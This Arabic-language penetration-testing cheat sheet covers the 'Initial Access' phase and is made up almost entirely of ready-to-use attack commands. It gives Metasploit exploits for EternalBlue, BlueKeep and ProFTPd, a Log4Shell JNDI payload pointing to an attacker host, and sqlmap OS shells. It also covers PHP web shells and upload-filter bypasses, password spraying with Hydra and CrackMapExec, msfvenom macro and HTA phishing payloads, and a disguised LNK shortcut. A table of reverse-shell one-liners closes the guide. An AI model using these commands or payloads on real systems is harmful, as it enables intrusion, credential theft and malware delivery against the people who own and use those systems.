<a id="-phase-1-initial-access"></a>
# 🚪 المرحلة 1: الوصول الأولي (Initial Access)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**الهدف:** الحصول على موطئ قدم أولي داخل الشبكة أو النظام المستهدف.

---

<a id="-attack-vectors"></a>
## 🎯 مسارات الهجوم

| المسار | الوصف |
|--------|-------------|
| **استغلال تطبيق متاح للعامة** | ثغرات تطبيقات الويب وواجهات API وأنظمة إدارة المحتوى CMS |
| **التصيد الاحتيالي** | رسائل بريد ضارة تتضمن حمولات هجومية (Payloads) |
| **بيانات اعتماد صالحة** | رش كلمات المرور وإعادة استخدام بيانات اعتماد مسربة |
| **الخدمات الخارجية** | خدمات RDP وSSH وVPN وFTP المكشوفة |
| **سلسلة التوريد** | اختراق برمجيات موثوقة |

---

<a id="-exploiting-known-vulnerabilities"></a>
## 💻 استغلال الثغرات المعروفة

> **ملاحظة توافق:** أسماء ملفات الاستغلال مثل `JNDI-Exploit.jar` و`proxyshell_exploit.py` أمثلة من الأصل؛ لا يرفقها هذا الدليل. يلزم التحقق من مصدر كل ملف وخياراته وتوافر أي سكربت NSE مذكور في بيئة المختبر قبل استخدام المثال.


<a id="search-for-exploits"></a>
### البحث عن شيفرات الاستغلال
```bash
# SearchSploit — قاعدة محلية لشيفرات الاستغلال
searchsploit apache 2.4
searchsploit -m 41234  # نسخ شيفرة الاستغلال إلى المجلد الحالي
searchsploit --nmap scan.xml  # قراءة نتائج Nmap

# البحث في Metasploit
msfconsole -q -x "search type:exploit apache"
```

<a id="common-exploits"></a>
### استغلالات شائعة

<a id="eternalblue-ms17-010---windows-smb"></a>
#### EternalBlue (MS17-010) - Windows SMB
```bash
# التحقق من قابلية الاستغلال
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# الاستغلال باستخدام Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

<a id="log4shell-cve-2021-44228"></a>
#### Log4Shell (CVE-2021-44228)
```bash
# اختبار وجود الثغرة
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# إعداد خادم الاستغلال
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

<a id="proxyshellproxylogon---exchange"></a>
#### ProxyShell/ProxyLogon - Exchange
```bash
# فحص ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# استخدام شيفرة الاستغلال
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

<a id="-web-application-attacks"></a>
## 🌐 هجمات تطبيقات الويب

<a id="sql-injection-get-shell"></a>
### حقن SQL للحصول على صدفة أوامر (Shell)
```bash
# اختبار حقن SQL
sqlmap -u "http://target.com/page?id=1" --batch

# الحصول على صدفة أوامر النظام عبر حقن SQL
sqlmap -u "http://target.com/page?id=1" --os-shell

# الحصول على صدفة SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

<a id="file-upload-to-shell"></a>
### رفع ملف للحصول على صدفة أوامر

> **ملاحظة:** أمثلة تجاوز امتداد الملف، ومنها `%00` والفاصلة المنقوطة، تعتمد على كيفية معالجة الاسم وإعدادات الخادم وإصداره؛ لا تمثل تجاوزاً عاماً. أُبقيت الأمثلة كما وردت في الأصل.

```bash
# إنشاء صدفة عكسية بلغة PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# أو صدفة PHP بسيطة
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# تجاوز مرشحات امتداد الملف
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

<a id="remote-code-execution-rce"></a>
### تنفيذ التعليمات البرمجية عن بُعد (RCE)
```bash
# اختبار تنفيذ الشيفرة عن بُعد
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# صدفة عكسية عبر تنفيذ الشيفرة عن بُعد
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

<a id="-credential-attacks"></a>
## 🔐 هجمات بيانات الاعتماد

<a id="password-spraying"></a>
### رش كلمات المرور (Password Spraying)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

<a id="credential-stuffing"></a>
### إعادة استخدام بيانات اعتماد مسربة (Credential Stuffing)
```bash
# استخدام بيانات اعتماد مسربة معروفة
hydra -C creds.txt ftp://192.168.1.10

# صيغة الملف creds.txt:
# username:password
```

<a id="default-credentials"></a>
### بيانات الاعتماد الافتراضية
```bash
# بيانات افتراضية شائعة للتجربة:
admin:admin
admin:password
root:root
root:toor
administrator:password

# استخدام CrackMapExec مع بيانات اعتماد شائعة
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

<a id="-phishing-payloads"></a>
## 📧 حمولات التصيد الاحتيالي

<a id="office-macro-payload"></a>
### حمولة ماكرو Office
```bash
# توليد حمولة ماكرو
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# أو استخدام msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

<a id="hta-payload"></a>
### حمولة HTA
```bash
# توليد ملف HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# استضافة الملف
python3 -m http.server 80
```

<a id="lnk-payload"></a>
### حمولة اختصار LNK
```powershell
# إنشاء اختصار ضار
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

<a id="-external-service-exploitation"></a>
## 🖥️ استغلال الخدمات الخارجية

<a id="rdp-exploitation"></a>
### استغلال RDP
```bash
# تخمين بيانات RDP بالقوة الغاشمة
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

<a id="ssh-exploitation"></a>
### استغلال SSH
```bash
# تخمين بيانات SSH بالقوة الغاشمة
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# اتصال SSH ببيانات اعتماد معروفة
ssh user@192.168.1.10

# اتصال SSH بمفتاح خاص
ssh -i id_rsa user@192.168.1.10
```

<a id="ftp-exploitation"></a>
### استغلال FTP
```bash
# تسجيل دخول مجهول
ftp 192.168.1.10
# اسم المستخدم: anonymous
# كلمة المرور: anonymous

# القوة الغاشمة
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# استغلال ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

<a id="-setting-up-listeners"></a>
## 🎧 إعداد مستمعي الاتصالات

<a id="netcat-listener"></a>
### مستمع Netcat
```bash
nc -lvnp 4444
```

<a id="metasploit-handler"></a>
### معالج الاتصالات في Metasploit
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

<a id="powercat-powershell"></a>
### أداة Powercat في PowerShell
```powershell
# على جهاز المهاجم
powercat -l -p 4444

# على الجهاز المستهدف
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="reverse-shell-one-liners"></a>
### أوامر الصدفة العكسية (Reverse Shell) في سطر واحد

| النظام | الأمر |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

<a id="-related-cheatsheets"></a>
## 🔗 أدلة مرجعية ذات صلة

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [ثغرات الويب](../../SSRF/README.md)

---

**المرحلة التالية:** [02 - حصر المعلومات والاكتشاف →](./02-Enumeration.ar.md)
